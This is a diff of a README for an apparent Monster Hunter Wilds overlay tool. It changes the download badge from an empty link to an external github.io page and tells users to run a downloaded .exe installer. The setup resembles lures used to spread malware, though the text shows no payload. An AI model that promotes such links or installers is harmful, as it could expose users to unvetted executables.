@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` installer – the overlay will be automatically applied when you launch Monster Hunter Wilds.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://mhwilds-overlay.github.io/.github/)
 
 ## 📸 Overview
 ![mhwilds-overlay-damage-meter](https://github.com/user-attachments/assets/1b480367-b513-4f8c-9776-da8713f5a20a)
